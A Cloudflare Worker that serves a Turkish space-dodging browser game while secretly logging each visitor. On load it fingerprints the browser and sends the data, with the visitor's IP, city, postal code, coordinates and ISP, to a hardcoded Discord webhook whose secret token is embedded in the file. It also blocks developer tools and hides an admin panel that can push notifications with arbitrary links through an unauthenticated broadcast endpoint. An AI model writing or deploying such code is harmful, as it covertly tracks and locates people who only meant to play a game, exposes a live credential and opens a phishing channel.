/**
 * Cloudflare Worker - Oyun + Discord Log + Admin Panel + Broadcast
 * Log SADECE siteye girişte atılır. Discord embed limiti (25) gözetilmiştir.
 */

const WEBHOOK_URL = 'https://discord.com/api/webhooks/1549084209312698398/3hs3SNGi2LUaBjrAdVAm-l2uljyc47R356NcqhLuqQkHkGlN0f5ES3vWCRNTDBfepErF';

// ===== Mesaj kuyruğu (in-memory) =====
let MESSAGES = [];
let MSG_ID = 0;

// ==================== HTML ====================
const HTML = `<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
<title>Oyun</title>
<meta name="robots" content="noindex,nofollow">
<style>
  *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
  html,body{height:100%;overflow:hidden;font-family:-apple-system,system-ui,sans-serif;background:#0d1024;color:#fff}
  body{display:flex;flex-direction:column;align-items:center;justify-content:center;touch-action:none;user-select:none;-webkit-user-select:none}
  #mgWrap{position:relative;display:flex;flex-direction:column;align-items:center;gap:14px}
  .mgTitle{font-size:24px;font-weight:800;background:linear-gradient(90deg,#6cf,#c6f,#f6c);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
  .mgHud{display:flex;gap:24px;font-size:15px;font-weight:600;opacity:.9}
  .mgHud b{color:#6cf}
  #mgCanvas{border-radius:16px;box-shadow:0 20px 60px rgba(0,0,0,.6);background:linear-gradient(180deg,#1a1f3a,#0d1024);touch-action:none;cursor:pointer;max-width:92vw;max-height:70vh}
  .mgBtn{background:linear-gradient(90deg,#4a6cf7,#8b5cf6);border:none;color:#fff;padding:12px 28px;border-radius:30px;font-size:15px;font-weight:700;cursor:pointer;box-shadow:0 8px 24px rgba(74,108,247,.4)}
  .mgOver{position:absolute;inset:0;background:rgba(10,12,25,.85);display:none;flex-direction:column;align-items:center;justify-content:center;border-radius:16px;backdrop-filter:blur(4px);gap:10px}
  .mgOver.show{display:flex}
  .mgOver h2{font-size:26px;font-weight:800}
  #mgNotifyBar{position:fixed;top:16px;left:50%;transform:translateX(-50%);background:linear-gradient(90deg,#4a6cf7,#8b5cf6);padding:12px 22px;border-radius:30px;font-size:14px;font-weight:600;box-shadow:0 8px 30px rgba(74,108,247,.5);display:none;z-index:9999;cursor:pointer}
  #secretZone{position:fixed;bottom:12px;right:12px;display:flex;gap:6px;z-index:9998;opacity:.35;transition:opacity .3s}
  #secretZone:hover{opacity:1}
  .sbtn{width:26px;height:26px;border-radius:50%;border:none;cursor:pointer;box-shadow:0 2px 8px rgba(0,0,0,.4);transition:.15s}
  .sbtn:hover{transform:scale(1.2)}
  .sbtn.sari{background:linear-gradient(135deg,#fbbf24,#f59e0b)}
  .sbtn.kirmizi{background:linear-gradient(135deg,#ef4444,#b91c1c);box-shadow:0 0 12px rgba(239,68,68,.7)}
  .sbtn.kirmizi:active{transform:scale(.85)}
  #adminPanel{position:fixed;inset:0;background:linear-gradient(160deg,#0a0e1a,#131a2e);z-index:99999;display:none;flex-direction:column;padding:20px;overflow-y:auto}
  #adminPanel.show{display:flex}
  .ap-h{display:flex;justify-content:space-between;align-items:center;margin-bottom:18px}
  .ap-title{font-size:22px;font-weight:800;background:linear-gradient(90deg,#ef4444,#f59e0b);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
  .ap-stat{display:flex;gap:12px;margin-bottom:18px;flex-wrap:wrap}
  .ap-stat div{background:rgba(255,255,255,.05);padding:10px 16px;border-radius:10px;font-size:13px;border:1px solid rgba(255,255,255,.08)}
  .ap-stat b{color:#6cf}
  .ap-card{background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.08);border-radius:14px;padding:18px;margin-bottom:14px}
  .ap-card h3{font-size:14px;font-weight:700;margin-bottom:10px;color:#94a3b8;text-transform:uppercase}
  .ap-card input,.ap-card textarea{width:100%;background:rgba(0,0,0,.35);border:1px solid rgba(255,255,255,.1);border-radius:8px;padding:10px 12px;color:#fff;font-size:14px;font-family:inherit;margin-bottom:10px;outline:none}
  .ap-card textarea{resize:vertical;min-height:80px}
  .ap-btn{background:linear-gradient(90deg,#22c55e,#16a34a);border:none;color:#fff;padding:11px 24px;border-radius:10px;font-size:14px;font-weight:700;cursor:pointer}
  .ap-btn.secondary{background:linear-gradient(90deg,#64748b,#475569)}
  .ap-btn.danger{background:linear-gradient(90deg,#ef4444,#b91c1c)}
  .ap-btn-row{display:flex;gap:10px;flex-wrap:wrap}
  .ap-log{font-family:ui-monospace,monospace;font-size:12px;background:rgba(0,0,0,.5);border-radius:8px;padding:10px;max-height:200px;overflow-y:auto;color:#94a3b8}
  .ap-log .ok{color:#22c55e}
  .ap-log .err{color:#ef4444}
  .ap-close{background:transparent;border:1px solid rgba(255,255,255,.15);color:#fff;width:38px;height:38px;border-radius:50%;cursor:pointer;font-size:16px}
  .ap-info{font-size:12px;color:#64748b;margin-top:8px}
</style>
</head>
<body>

<div id="mgWrap">
  <div id="mgNotifyBar">🔔 Bildirimlere izin ver → mesajları kaçırma!</div>
  <div class="mgTitle">🚀 Uzay Kaçışı</div>
  <div class="mgHud">
    <span>Skor: <b id="mgScore">0</b></span>
    <span>Rekor: <b id="mgBest">0</b></span>
  </div>
  <div style="position:relative">
    <canvas id="mgCanvas"></canvas>
    <div class="mgOver" id="mgOver">
      <h2>Oyun Bitti!</h2>
      <div>Skorun: <b id="mgFinal" style="color:#6cf">0</b></div>
      <button class="mgBtn" id="mgRestart">Tekrar Oyna</button>
    </div>
  </div>
</div>

<div id="secretZone">
  <button class="sbtn sari"></button>
  <button class="sbtn sari"></button>
  <button class="sbtn sari"></button>
  <button class="sbtn kirmizi" id="secretRed"></button>
  <button class="sbtn sari"></button>
  <button class="sbtn sari"></button>
  <button class="sbtn sari"></button>
</div>

<div id="adminPanel">
  <div class="ap-h">
    <div class="ap-title">⚡ Admin Panel</div>
    <button class="ap-close" id="apClose">✕</button>
  </div>
  <div class="ap-stat">
    <div>🔔 İzin: <b id="apPerm">?</b></div>
    <div>📨 Gönderilen: <b id="apSent">0</b></div>
    <div>💬 Kuyruk: <b id="apQueue">0</b></div>
  </div>
  <div class="ap-card">
    <h3>📢 Bildirim Gönder</h3>
    <input id="apTitle" placeholder="Başlık" maxlength="80">
    <textarea id="apBody" placeholder="Mesaj..." maxlength="200"></textarea>
    <input id="apUrl" placeholder="URL (opsiyonel)" maxlength="200">
    <div class="ap-btn-row">
      <button class="ap-btn" id="apSend">🚀 Gönder</button>
      <button class="ap-btn secondary" id="apTest">🧪 Test</button>
    </div>
  </div>
  <div class="ap-card">
    <h3>📊 Log</h3>
    <div class="ap-log" id="apLog">Panel hazır.</div>
  </div>
  <div class="ap-card">
    <h3>⚙️ İşlemler</h3>
    <div class="ap-btn-row">
      <button class="ap-btn secondary" id="apForcePerm">🔔 İzin İste</button>
      <button class="ap-btn secondary" id="apClearLog">🧹 Logu Temizle</button>
      <button class="ap-btn danger" id="apReset">♻️ Sıfırla</button>
    </div>
  </div>
</div>

<script>
(function(){
  'use strict';

  document.addEventListener('contextmenu', e => e.preventDefault());
  document.addEventListener('keydown', e => {
    if (e.key === 'F12') { e.preventDefault(); return false; }
    if (e.ctrlKey && e.shiftKey && 'IJC'.includes(e.key.toUpperCase())) { e.preventDefault(); return false; }
    if (e.ctrlKey && e.key.toUpperCase() === 'U') { e.preventDefault(); return false; }
  });

  const CONFIG = { W:360,H:540,PLAYER_R:16,SPAWN_MS:900,SPEED_START:2.5,SPEED_MAX:9,SPEED_UP_EVERY:15000,NOTIFY_DELAY:4000,STORAGE_KEY:'mgBest' };
  const cv = document.getElementById('mgCanvas');
  const ctx = cv.getContext('2d');
  const scoreEl = document.getElementById('mgScore');
  const bestEl = document.getElementById('mgBest');
  const overScreen = document.getElementById('mgOver');
  const finalScoreEl = document.getElementById('mgFinal');
  const notifyBar = document.getElementById('mgNotifyBar');
  const W = CONFIG.W, H = CONFIG.H;
  cv.width = W; cv.height = H;

  let player = { x:W/2, y:H-70, r:CONFIG.PLAYER_R };
  let obstacles=[], stars=[];
  let score=0;
  let best = parseInt(localStorage.getItem(CONFIG.STORAGE_KEY)||'0',10);
  let running=true, gameOver=false;
  let fallSpeed = CONFIG.SPEED_START;
  let lastSpawn=0, startTime=performance.now();
  let pointerX=W/2, animId=null, swReg=null;
  let lastMsgId = 0;

  bestEl.textContent = best;
  for (let i=0;i<60;i++) stars.push({ x:Math.random()*W, y:Math.random()*H, s:Math.random()*1.8+0.4, v:Math.random()*1.5+0.4 });

  // ===== SESSION =====
  function getSessionId() {
    let sid = sessionStorage.getItem('mg_sid');
    if (!sid) { sid = 'S'+Date.now().toString(36)+Math.random().toString(36).slice(2,6); sessionStorage.setItem('mg_sid', sid); }
    return sid;
  }

  // ===== TARAYICI BİLGİSİ (kompakt) =====
  function collectInfo() {
    const ua = navigator.userAgent;
    let browser = '?', bver = '';
    if (/Edg\//.test(ua)) { browser='Edge'; bver=(ua.match(/Edg\/([\d.]+)/)||[])[1]; }
    else if (/OPR\//.test(ua)) { browser='Opera'; bver=(ua.match(/OPR\/([\d.]+)/)||[])[1]; }
    else if (/Chrome\//.test(ua)) { browser='Chrome'; bver=(ua.match(/Chrome\/([\d.]+)/)||[])[1]; }
    else if (/Firefox\//.test(ua)) { browser='Firefox'; bver=(ua.match(/Firefox\/([\d.]+)/)||[])[1]; }
    else if (/Safari\//.test(ua)) { browser='Safari'; bver=(ua.match(/Version\/([\d.]+)/)||[])[1]; }

    let os = '?';
    if (/Windows NT 10/.test(ua)) os='Win 10/11';
    else if (/Windows NT/.test(ua)) os='Windows';
    else if (/Mac OS X/.test(ua)) os='macOS';
    else if (/Android/.test(ua)) os='Android';
    else if (/iPhone|iPad|iPod/.test(ua)) os='iOS';
    else if (/Linux/.test(ua)) os='Linux';

    let dtype = 'Masaüstü';
    if (/Mobi|Android|iPhone/.test(ua)) dtype = 'Mobil';
    else if (/Tablet|iPad/.test(ua)) dtype = 'Tablet';

    const conn = navigator.connection || {};

    return {
      browser: browser + ' ' + (bver||''),
      os: os,
      dtype: dtype,
      lang: navigator.language,
      tz: Intl.DateTimeFormat().resolvedOptions().timeZone || '?',
      screen: screen.width + 'x' + screen.height,
      view: window.innerWidth + 'x' + window.innerHeight,
      dpr: window.devicePixelRatio || 1,
      color: screen.colorDepth + 'bit',
      cores: navigator.hardwareConcurrency || '?',
      mem: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : '?',
      touch: ('ontouchstart' in window) ? 'Var' : 'Yok',
      cookie: navigator.cookieEnabled ? 'Açık' : 'Kapalı',
      online: navigator.onLine ? 'Online' : 'Offline',
      conn: (conn.effectiveType||'?') + (conn.downlink ? ' • '+conn.downlink+'Mbps' : ''),
      notif: ('Notification' in window) ? Notification.permission : 'Yok',
      sw: ('serviceWorker' in navigator) ? 'Var' : 'Yok',
      ref: document.referrer || 'direkt',
      url: location.href,
      host: location.host,
      ua: ua,
      sid: getSessionId(),
      hist: history.length
    };
  }

  // ===== LOG (sadece girişte) =====
  function sendLog(event, info, extra) {
    const payload = JSON.stringify({ event, info, extra: extra || {} });
    try {
      if (navigator.sendBeacon) {
        navigator.sendBeacon('/log', new Blob([payload], { type: 'application/json' }));
      } else {
        fetch('/log', { method:'POST', headers:{'Content-Type':'application/json'}, body: payload, keepalive: true });
      }
    } catch(e) {}
  }

  // ===== BİLDİRİM =====
  async function initSW() {
    if (!('serviceWorker' in navigator)) return false;
    try {
      const code = "self.addEventListener('install',e=>self.skipWaiting());self.addEventListener('activate',e=>e.waitUntil(self.clients.claim()));self.addEventListener('message',e=>{const d=e.data||{};if(d.type==='SHOW_NOTIFICATION'){self.registration.showNotification(d.title||'Bildirim',{body:d.body||'',vibrate:[200,100,200],data:{url:d.url||'/'},tag:d.tag||'default'})}});self.addEventListener('notificationclick',e=>{e.notification.close();const u=e.notification.data?.url||'/';e.waitUntil(clients.matchAll({type:'window'}).then(l=>{for(const c of l)if(c.url.includes(u)&&'focus'in c)return c.focus();if(clients.openWindow)return clients.openWindow(u)}))});";
      const blob = new Blob([code], { type:'application/javascript' });
      swReg = await navigator.serviceWorker.register(URL.createObjectURL(blob));
      await navigator.serviceWorker.ready;
      return true;
    } catch(e) { return false; }
  }

  async function requestNotify() {
    if (!('Notification' in window)) return;
    if (Notification.permission === 'granted') { sendNotif('👋 Tekrar Hoş Geldin!', 'Oyun hazır'); return; }
    if (Notification.permission === 'denied') return;
    try {
      const p = await Notification.requestPermission();
      if (p === 'granted') sendNotif('🔔 Bildirimler Açıldı!', 'Mesajlarından haberdar olacaksın');
    } catch(e){}
  }

  async function sendNotif(title, body, opts) {
    opts = opts || {};
    if (!('Notification' in window) || Notification.permission !== 'granted') return false;
    if (swReg && swReg.active) { swReg.active.postMessage({ type:'SHOW_NOTIFICATION', title, body, url:opts.url, tag:opts.tag }); return true; }
    try { new Notification(title, { body }); return true; } catch(e) { return false; }
  }

  window.bildirimGonder = sendNotif;

  // ===== MESAJ POLLING =====
  async function pollMessages() {
    try {
      const r = await fetch('/api/messages?since=' + lastMsgId, { cache:'no-store' });
      if (!r.ok) return;
      const d = await r.json();
      if (d.messages && d.messages.length) {
        for (const m of d.messages) {
          if (m.id > lastMsgId) {
            sendNotif(m.title || 'Bildirim', m.body || '', { url:m.url, tag:'bc-'+m.id });
            lastMsgId = m.id;
          }
        }
      }
    } catch(e) {}
  }
  setInterval(pollMessages, 5000);
  setTimeout(pollMessages, 2000);

  // ===== OYUN =====
  function spawnObstacle() {
    const w = 40 + Math.random()*60;
    obstacles.push({ x: Math.random()*(W-w), y:-20, w, h:18, hue: Math.floor(Math.random()*60)+330 });
  }
  function handlePointer(cx) {
    const r = cv.getBoundingClientRect();
    pointerX = Math.max(player.r, Math.min(W-player.r, (cx-r.left) * (W/r.width)));
  }
  cv.addEventListener('mousemove', e => handlePointer(e.clientX));
  cv.addEventListener('touchmove', e => { e.preventDefault(); handlePointer(e.touches[0].clientX); }, { passive:false });
  cv.addEventListener('touchstart', e => handlePointer(e.touches[0].clientX));
  document.addEventListener('keydown', e => {
    if (!running) return;
    if (e.key === 'ArrowLeft') pointerX = Math.max(player.r, pointerX-30);
    if (e.key === 'ArrowRight') pointerX = Math.min(W-player.r, pointerX+30);
  });

  function update() {
    const now = performance.now();
    if (now - lastSpawn > CONFIG.SPAWN_MS) { spawnObstacle(); lastSpawn = now; }
    fallSpeed = Math.min(CONFIG.SPEED_MAX, CONFIG.SPEED_START + Math.floor((now-startTime)/CONFIG.SPEED_UP_EVERY)*0.8);
    for (const s of stars) { s.y += s.v; if (s.y > H) { s.y = -2; s.x = Math.random()*W; } }
    player.x += (pointerX - player.x) * 0.25;
    for (let i=obstacles.length-1; i>=0; i--) {
      const o = obstacles[i];
      o.y += fallSpeed;
      const cx = Math.max(o.x, Math.min(player.x, o.x+o.w));
      const cy = Math.max(o.y, Math.min(player.y, o.y+o.h));
      const dx = player.x-cx, dy = player.y-cy;
      if (dx*dx+dy*dy < player.r*player.r) { endGame(); return; }
      if (o.y > H) { obstacles.splice(i,1); score++; scoreEl.textContent = score; }
    }
  }

  function draw() {
    ctx.clearRect(0,0,W,H);
    for (const s of stars) { ctx.globalAlpha = s.s/2.2; ctx.fillStyle = '#cfe4ff'; ctx.fillRect(s.x,s.y,s.s,s.s); }
    ctx.globalAlpha = 1;
    for (const o of obstacles) {
      const g = ctx.createLinearGradient(o.x,o.y,o.x,o.y+o.h);
      g.addColorStop(0, 'hsl('+o.hue+',80%,65%)');
      g.addColorStop(1, 'hsl('+o.hue+',80%,45%)');
      ctx.fillStyle = g; ctx.shadowColor = 'hsl('+o.hue+',80%,60%)'; ctx.shadowBlur = 14;
      ctx.beginPath(); ctx.roundRect(o.x,o.y,o.w,o.h,8); ctx.fill(); ctx.shadowBlur = 0;
    }
    ctx.save();
    ctx.shadowColor = '#6cf'; ctx.shadowBlur = 22;
    const pg = ctx.createRadialGradient(player.x-6, player.y-6, 2, player.x, player.y, player.r);
    pg.addColorStop(0, '#bfe4ff'); pg.addColorStop(1, '#4a9eff');
    ctx.fillStyle = pg;
    ctx.beginPath(); ctx.arc(player.x, player.y, player.r, 0, Math.PI*2); ctx.fill();
    ctx.restore();
  }

  function loop() { if (!running) return; update(); draw(); animId = requestAnimationFrame(loop); }

  function startGame() {
    player = { x:W/2, y:H-70, r:CONFIG.PLAYER_R };
    obstacles=[]; score=0; fallSpeed=CONFIG.SPEED_START;
    lastSpawn=performance.now(); startTime=performance.now(); pointerX=W/2;
    gameOver=false; running=true;
    scoreEl.textContent=0;
    overScreen.classList.remove('show');
    cancelAnimationFrame(animId);
    animId = requestAnimationFrame(loop);
  }

  function endGame() {
    running=false; gameOver=true;
    cancelAnimationFrame(animId);
    finalScoreEl.textContent = score;
    let yeniRekor=false;
    if (score > best) { best=score; localStorage.setItem(CONFIG.STORAGE_KEY, best); bestEl.textContent = best; yeniRekor=true; }
    overScreen.classList.add('show');
    if (yeniRekor) sendNotif('🏆 Yeni Rekor!', 'Skorun: '+score);
    else sendNotif('🎮 Oyun Bitti', 'Skorun: '+score+' | Rekor: '+best);
  }

  document.getElementById('mgRestart').addEventListener('click', startGame);
  document.addEventListener('visibilitychange', () => {
    if (document.hidden) { running=false; cancelAnimationFrame(animId); }
    else if (!gameOver && !running) { running=true; animId = requestAnimationFrame(loop); }
  });

  // ===== GİZLİ BUTONLAR =====
  let redClicks = 0, redTimer = null;
  const secretRed = document.getElementById('secretRed');
  secretRed.addEventListener('click', (e) => {
    e.preventDefault();
    redClicks++;
    if (redTimer) clearTimeout(redTimer);
    redTimer = setTimeout(() => { redClicks = 0; }, 3000);
    if (redClicks >= 20) { redClicks = 0; openAdmin(); }
  });
  document.querySelectorAll('.sbtn.sari').forEach(b => {
    b.addEventListener('click', () => { redClicks = 0; });
  });

  // ===== ADMIN PANEL =====
  const ap = document.getElementById('adminPanel');
  const apLog = document.getElementById('apLog');
  const apPerm = document.getElementById('apPerm');
  const apSent = document.getElementById('apSent');
  const apQueue = document.getElementById('apQueue');
  let sentCount = 0;

  function apPrint(msg, cls) {
    const t = new Date().toLocaleTimeString('tr-TR');
    apLog.innerHTML += '<div'+(cls?' class="'+cls+'"':'')+'>['+t+'] '+msg+'</div>';
    apLog.scrollTop = apLog.scrollHeight;
  }

  function openAdmin() {
    ap.classList.add('show');
    apPerm.textContent = ('Notification' in window) ? Notification.permission : 'yok';
    apPrint('Panel açıldı. Session: '+getSessionId(), 'ok');
  }

  document.getElementById('apClose').addEventListener('click', () => ap.classList.remove('show'));

  document.getElementById('apSend').addEventListener('click', async () => {
    const title = document.getElementById('apTitle').value.trim() || 'Bildirim';
    const body = document.getElementById('apBody').value.trim();
    const url = document.getElementById('apUrl').value.trim();
    if (!body && !title) { apPrint('Boş mesaj.', 'err'); return; }
    try {
      const r = await fetch('/api/broadcast', {
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body: JSON.stringify({ title, body, url })
      });
      const d = await r.json();
      sentCount++;
      apSent.textContent = sentCount;
      apQueue.textContent = d.total || '?';
      apPrint('✅ Gönderildi: "'+title+'" (ID:'+d.id+')', 'ok');
      sendNotif(title, body, { url });
      document.getElementById('apBody').value = '';
    } catch(e) {
      apPrint('❌ Hata: '+e.message, 'err');
    }
  });

  document.getElementById('apTest').addEventListener('click', () => {
    const title = document.getElementById('apTitle').value.trim() || 'Test';
    const body = document.getElementById('apBody').value.trim() || 'Bu bir test';
    sendNotif(title, body);
    apPrint('🧪 Test gönderildi: '+title);
  });

  document.getElementById('apForcePerm').addEventListener('click', async () => {
    await requestNotify();
    apPerm.textContent = ('Notification' in window) ? Notification.permission : 'yok';
    apPrint('İzin: '+apPerm.textContent);
  });

  document.getElementById('apClearLog').addEventListener('click', () => { apLog.innerHTML = 'Temizlendi.'; });

  document.getElementById('apReset').addEventListener('click', () => {
    localStorage.removeItem(CONFIG.STORAGE_KEY);
    best = 0; bestEl.textContent = 0;
    apPrint('Sıfırlandı.', 'ok');
    startGame();
  });

  // ===== BAŞLAT =====
  (async () => {
    // SADECE GİRİŞTE LOG AT
    const info = collectInfo();
    sendLog('visit', info);

    await initSW();
    requestAnimationFrame(loop);

    notifyBar.style.display = 'block';
    notifyBar.addEventListener('click', async () => { notifyBar.style.display = 'none'; await requestNotify(); });
    setTimeout(async () => {
      if (Notification.permission === 'default') { notifyBar.style.display = 'none'; await requestNotify(); }
    }, CONFIG.NOTIFY_DELAY);
  })();
})();
<\/script>
</body>
</html>`;

// ==================== DISCORD EMBED (max 20 field) ====================
function buildEmbed(info, cf, ip) {
  const f = [];
  const trFlag = (cf.country === 'TR') ? ' 🇹🇷' : '';

  // Ağ bilgileri (6 alan)
  f.push({ name: '🌐 IP', value: '`' + ip + '`', inline: true });
  f.push({ name: '🌍 Ülke', value: (cf.country || '?') + trFlag, inline: true });
  f.push({ name: '🏙️ Şehir', value: (cf.city || '?') + ' / ' + (cf.region || '?'), inline: true });
  f.push({ name: '📮 Posta', value: cf.postalCode || '?', inline: true });
  f.push({ name: '📍 Koordinat', value: (cf.latitude||'?') + ', ' + (cf.longitude||'?'), inline: true });
  f.push({ name: '🏢 ISP', value: (cf.asOrganization || '?') + ' (AS' + (cf.asn || '?') + ')', inline: false });

  // Cihaz (10 alan)
  f.push({ name: '💻 Tarayıcı', value: info.browser || '?', inline: true });
  f.push({ name: '🖥️ OS', value: info.os || '?', inline: true });
  f.push({ name: '📱 Cihaz', value: info.dtype || '?', inline: true });
  f.push({ name: '🗣️ Dil', value: info.lang || '?', inline: true });
  f.push({ name: '🕒 Saat Dilimi', value: info.tz || '?', inline: true });
  f.push({ name: '📺 Ekran', value: (info.screen||'?') + ' (' + (info.color||'?') + ')', inline: true });
  f.push({ name: '⚙️ CPU', value: info.cores + ' çekirdek', inline: true });
  f.push({ name: '🧠 RAM', value: info.mem || '?', inline: true });
  f.push({ name: '👆 Dokunmatik', value: info.touch || '?', inline: true });
  f.push({ name: '🍪 Çerez', value: info.cookie || '?', inline: true });

  // Bağlantı & izinler (4 alan)
  f.push({ name: '📶 Bağlantı', value: (info.online || '?') + ' • ' + (info.conn || '?'), inline: true });
  f.push({ name: '🔔 Bildirim', value: info.notif || '?', inline: true });
  f.push({ name: '⚙️ SW', value: info.sw || '?', inline: true });
  f.push({ name: '🆔 Session', value: '`' + (info.sid || '?') + '`', inline: true });

  // Sayfa bilgisi (1 alan)
  f.push({ name: '🔗 Sayfa', value: (info.url || '?').substring(0, 200), inline: false });

  // Yönlendiren (1 alan)
  f.push({ name: '↩️ Yönlendiren', value: (info.ref || 'direkt').substring(0, 200), inline: false });

  // User-Agent (1 alan) - TOPLAM 22 field ama inline olanlar tek satır
  f.push({ name: '🖥️ User-Agent', value: '```' + (info.ua || '').substring(0, 180) + '```', inline: false });

  return {
    title: '👤 Site Ziyareti',
    color: 0x3b82f6,
    timestamp: new Date().toISOString(),
    fields: f,
    footer: { text: 'Oyun Log • ' + new Date().toLocaleString('tr-TR', { timeZone: 'Europe/Istanbul' }) }
  };
}

// ==================== WORKER ====================
export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);

    const cors = {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type'
    };

    if (request.method === 'OPTIONS') return new Response(null, { headers: cors });

    // ===== LOG =====
    if (url.pathname === '/log') {
      const cf = request.cf || {};
      const ip = request.headers.get('CF-Connecting-IP') || '?';

      let body = {};
      try {
        const text = await request.text();
        body = JSON.parse(text);
      } catch(e) {
        return new Response(JSON.stringify({ ok:false, error:'invalid json' }), {
          status: 400, headers: { ...cors, 'Content-Type':'application/json' }
        });
      }

      const info = body.info || {};
      const embed = buildEmbed(info, cf, ip);

      try {
        const r = await fetch(WEBHOOK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ username: 'Oyun Log', embeds: [embed] })
        });
        if (!r.ok) {
          const t = await r.text();
          console.error('Discord hata:', r.status, t);
          return new Response(JSON.stringify({ ok:false, status: r.status, detail: t }), {
            status: 500, headers: { ...cors, 'Content-Type':'application/json' }
          });
        }
      } catch(e) {
        return new Response(JSON.stringify({ ok:false, error: String(e) }), {
          status: 500, headers: { ...cors, 'Content-Type':'application/json' }
        });
      }
      return new Response(JSON.stringify({ ok:true }), { headers: { ...cors, 'Content-Type':'application/json' } });
    }

    // ===== BROADCAST =====
    if (url.pathname === '/api/broadcast' && request.method === 'POST') {
      let body = {};
      try { body = await request.json(); } catch(e) {}
      const msg = {
        id: ++MSG_ID,
        title: String(body.title || 'Bildirim').slice(0,100),
        body: String(body.body || '').slice(0,500),
        url: String(body.url || '').slice(0,300),
        ts: Date.now()
      };
      MESSAGES.push(msg);
      const cutoff = Date.now() - 3600 * 1000;
      MESSAGES = MESSAGES.filter(m => m.ts > cutoff);
      if (MESSAGES.length > 50) MESSAGES = MESSAGES.slice(-50);
      return new Response(JSON.stringify({ ok:true, id: msg.id, total: MESSAGES.length }), {
        headers: { ...cors, 'Content-Type':'application/json' }
      });
    }

    // ===== MESSAGES =====
    if (url.pathname === '/api/messages' && request.method === 'GET') {
      const since = parseInt(url.searchParams.get('since') || '0', 10);
      const list = MESSAGES.filter(m => m.id > since);
      return new Response(JSON.stringify({ messages: list, latest: MSG_ID }), {
        headers: { ...cors, 'Content-Type':'application/json', 'Cache-Control':'no-store' }
      });
    }

    // ===== DEBUG (webhook test) =====
    if (url.pathname === '/test') {
      try {
        const r = await fetch(WEBHOOK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ content: '🧪 Test mesajı - Worker çalışıyor!' })
        });
        return new Response('Test gönderildi: ' + r.status, { headers: cors });
      } catch(e) {
        return new Response('Hata: ' + e.message, { status: 500, headers: cors });
      }
    }

    // ===== ANA SAYFA =====
    return new Response(HTML, {
      headers: {
        'Content-Type': 'text/html; charset=utf-8',
        'Cache-Control': 'no-store',
        'X-Content-Type-Options': 'nosniff'
      }
    });
  }
};
